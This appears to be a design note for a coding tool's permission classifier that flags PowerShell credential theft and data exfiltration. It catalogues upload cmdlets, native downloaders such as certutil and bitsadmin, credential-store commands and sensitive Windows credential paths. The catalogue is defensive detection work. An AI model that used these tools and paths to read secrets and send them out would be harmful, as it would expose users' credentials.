`src/permissions/rules/powershell-exfiltration.ts` preserves the structural
analysis and the credential/sink vocabulary. The invocation pipeline gives both
canonical host-shell tools a shell rule subject with a `dialect`; an unknown
dialect is a contract violation. The PowerShell reading includes the shared
credential/sink reading of visible text plus a PowerShell-aware pass:

- PowerShell script blocks and `pwsh`/`powershell` inline command text use this catalogue. Other interpreter code uses generic credential/sink inspection with literal text and inline readers/senders retained. A `print` expression in `python` or `perl` does not acquire the PowerShell printer-port sink meaning.
- Cmdlets and aliases include `Invoke-WebRequest`/`iwr`,
  `Invoke-RestMethod`/`irm`, and `curl`/`wget`, their aliases in Windows PowerShell
  5.1. Analysis retains parameter-name prefixes (`-InF`), `(…)`/`$(…)`/`{…}`/
  `@{…}` groups, assignments, `foreach (… in …)`, file-fed pipeline `$_`, and
  `@p` splats of a hashtable assigned in the same command.
- Senders retain `-InFile`, file-derived arguments, pipeline input bound to
  `-Body`, `Start-BitsTransfer -TransferType Upload`,
  `Send-MailMessage -Attachments`, `Copy-Item -ToSession`,
  `WebClient.UploadFile`, `.NET` upload methods given file data, other network
  cmdlets (`Resolve-DnsName`, `Test-NetConnection`, …) given file data.
  Static and opaque transport splats retain the catalogue's credential/sink floors; unresolved non-transport bindings remain ordinary. Independently visible upload arguments still receive sink inspection.
- Catalogue credential-store commands and certificate exports retain their floors, including `cmdkey`, `vaultcmd`, `Get-Secret`, `Get-StoredCredential` and `Export-PfxCertificate`. Catalogued native transfer/downloader effects remain covered, including `bitsadmin.exe`, `certutil.exe`, `certreq.exe` and `desktopimgdownldr.exe`. Known credential/sink effects remain visible in process-launcher argument payloads, executed job script blocks and background commands.
- File-data sources retain `Get-Content`/`gc`/`cat`/`type`, `Select-String`,
  `Import-Clixml`, `Get-Item`, `[IO.File]::Read*`, `Get-Secret`,
  `Get-StoredCredential`, `cmdkey`, `env:` listings, and variables assigned
  from them. Path normalization retains `$env:USERPROFILE`, `$env:HOME`,
  `${env:…}`, `$HOME`, `~\`, backslashes, backtick escapes and `FileSystem::`.
- Native switches belong to the native program. Literal local data remains data. This argument role does not prove read-only effects, grant execution or establish a runner command boundary. Opaque interpreter bindings retain an ordinary reason; statically bound direct inline or script-file code does not create one by itself. Neither proves read-only script contents. Arguments after a literal script-file operand or a modeled module retain the existing script policy.
- Local write destinations and contents have distinct bindings. Values written
  to a known local file remain data, including unresolved values and quoted
  command examples. Executed subexpressions retain their checks. Unknown
  destinations, remote shares and printer ports retain their sink inspection.
  Supported here-string escapes are decoded; unsupported escapes retain an
  ordinary reason when their role is opaque, with any identified floor taking
  precedence.
- Within one input and executed nested frames, established writes, copies,
  moves, renames, downloads and extraction retain destination paths and
  leaf/stem spellings. Later execution of a matching path or command stays an
  ordinary ask unless credentials or a sink are identified. Modeled interpreter
  test/build discovery after executable or untyped writes retains the same
  ordinary reason and document-type exemptions from
  `powershell-file-provenance.ts`. Copied catalogue executables retain their
  identity through renames, so a copied sender still receives sink analysis.
  Unknown native argv does not establish written paths. Provenance is not
  persisted across calls. An arbitrary earlier file write does not couple a
  later package task to that file or infer manifest contents.
- `Invoke-Item`/`ii` retains support for literal document/media/data types and
  explicit directory spellings. An unsuffixed literal path can be admitted when
  `statSync(...).isDirectory()` confirms a directory in the current host
  context. This metadata exception is disabled after possible filesystem
  effects and in launcher/code-probe frames; queries consume the shared budget.
  Missing extensionless paths, regular extensionless files, nonliteral values,
  expressions and splats stay ordinary unless an independent floor applies.
  Metadata does not prove future type stability or inspect file contents.
- Parser refusal and global/recursive budget exhaustion carry their specific
  ordinary reason. Existing fallback inspection retains visible credential and
  upload signals, which take precedence over that reason. Executed nested
  frames propagate ordinary asks. Literal quoted code is inspected for visible
  credentials and sinks without treating unknown code as exfiltration.

As in Bash, a token variable in a header and plain `Invoke-WebRequest` GETs,
including `-OutFile`, do not establish the exfiltration floor by themselves.
The rule classifier grades the builtin `powershell` tool with the same reading.

### Dialect-scoped rules and grants

PowerShell currently has no per-command rule language. `Bash(...)` rules match
`bash` only and a PowerShell call carries no project command-rule scope.
Existing tool allow rules and saved grants can satisfy PowerShell's ordinary
asks, including opaque runners and parser refusal; they cannot satisfy a
credential/sink floor. No `PowerShell(...)` command-rule grammar is introduced.

`sensitive-paths.ts` retains the home-anchored credential rows marked `windows`:
`AppData/Roaming|Local/Microsoft/Credentials`, `Microsoft/Protect`,
`Microsoft/Crypto`, `Microsoft/Vault`,
`AppData/Local/Microsoft/PowerShell/secretmanagement`, and
`AppData/Roaming/GitHub CLI`, plus the host-guard-only
`User Data/**/Login Data` pattern. They match case-insensitively on every
platform. Shared profile stores (`.ssh`, `.aws`, `.azure`, `.kube/config`,
`.docker/config.json`, `.git-credentials`) keep their single path rows and
anchor-free matching under `C:/Users/<name>/`.

### Egress and verification boundary

The sink catalogue remains necessary until a separate egress boundary exists.
The OS tool sandbox is opt-in. Its current network policy is a strict shared
allowlist, with no per-domain approval callback or denial UI. Windows host-shell
execution remains a plain child. This classifier change does not introduce a
proxy, change sandbox defaults, delegate all egress to isolation, or make all
sandbox-off calls ask. Shell URLs and remote package/registry sources alone do
not replace credential/sink evidence.

The decision-table and classifier checks establish policy-analysis behavior.
Native shell execution and proxy/sandbox egress behavior are not validated by
this change.

### Approval rules UI

Settings accepts canonical `Bash(...)` rules, including whitespace inside their command prefix. The dock saves through the same `PermissionManager.addRulePersist` method. Revocation uses `removeRulePersist` for rules and the existing Store B revoke method for exact approvals. Each row identifies its decision, source and user, project, persistent or conversation scope. Revoking an entry affects subsequent permission checks; it does not answer an open approval request. Failed saves and revocations remain visible.

## Tests

- `src/permissions/__tests__/rules-language.test.ts` covers:
  - the grammar;
  - the refused list;
  - the wildcard allowlist, exact-only suggestions and irreversible commands;
  - compound commands, substitutions, wrappers and floors;
  - the `ls *` vs `lsof` case.
- `src/permissions/__tests__/rules-store-and-decision.test.ts` covers:
  - corrupt Store A, Store B and project files;
  - precedence across scopes;
  - ask beating `allow` mode;
  - persistence across restart;
  - sibling projects;
  - Store B coexistence;
  - the default-mode gate offering "remember" for `ls` / `npm test` but not `rm -rf`.
- `src/ui/renderer/components/__tests__/ToolApprovalContent-shell-rules.test.tsx` covers rule editing, refused prefixes, session scope, durable deny, save failure and English/Korean copy.
- `src/ui/renderer/tabs/__tests__/PermissionsTab.test.tsx` covers the unified list, refresh, scoped revocation and unavailable stores.
- `test/e2e/ui/approval-shell-rules.spec.ts` covers bilingual shell controls, one-shot credential requests and project-rule revocation through the host bridge.
